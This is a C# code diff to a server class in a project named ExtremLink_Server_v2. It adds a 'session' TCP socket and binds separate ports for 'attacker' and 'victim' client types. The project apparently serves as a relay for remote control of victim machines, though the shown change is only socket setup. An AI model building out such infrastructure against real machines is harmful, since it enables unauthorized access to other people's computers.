@@ -27,9 +27,12 @@ namespace ExtremLink_Server_v2.Classes
         // Integer constants which represent the sockets' ports:
         public readonly int ATTACKER_TCP_PORT = 1234;
         public readonly int ATTACKER_UDP_PORT = 1235;
+        public readonly int ATTACKER_SESSION_TCP_PORT = 1236;
 
         public readonly int VICTIM_TCP_PORT = 1847;
         public readonly int VICTIM_UDP_PORT = 1848;
+        public readonly int VICTIM_SESSION_TCP_PORT = 1849;
+
 
         // A string which represent the IP address of the server:
         private string serverIpAddress;
@@ -55,6 +58,14 @@ namespace ExtremLink_Server_v2.Classes
         {
             get { return this.udpSocket; }
             set { this.udpSocket = value; }
+        }
+
+        // A socket object of the session content (a tcp socket)
+        private Socket sessionTcpSocket;
+        public Socket SessionTcpSocket
+        {
+            get { return this.sessionTcpSocket; }
+            set { this.sessionTcpSocket = value; }
         }
 
         // An IPEndPoint for the udp connection:
@@ -120,18 +131,23 @@ namespace ExtremLink_Server_v2.Classes
             // Output: The function waits for client to connect to the server.
             this.tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             this.udpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+            this.sessionTcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
 
             this.ChangeSocketBufferSizeLimit(this.udpSocket, 4194304, 4194304);
+            this.ChangeSocketBufferSizeLimit(this.sessionTcpSocket, 4194304, 4194304);
 
             switch (this.TypeOfClient)
             {
                 case TypeOfClient.attacker:
                     this.tcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.ATTACKER_TCP_PORT));
                     this.udpSocket.Bind(new IPEndPoint(IPAddress.Any, this.ATTACKER_UDP_PORT));
+                    this.sessionTcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.ATTACKER_SESSION_TCP_PORT));
                     break;
                 case TypeOfClient.victim:
                     this.tcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.VICTIM_TCP_PORT));
                     this.udpSocket.Bind(new IPEndPoint(IPAddress.Any, this.VICTIM_UDP_PORT));
+                    this.sessionTcpSocket.Bind(new IPEndPoint(IPAddress.Parse(this.serverIpAddress), this.VICTIM_SESSION_TCP_PORT));
                     break;
             }
             
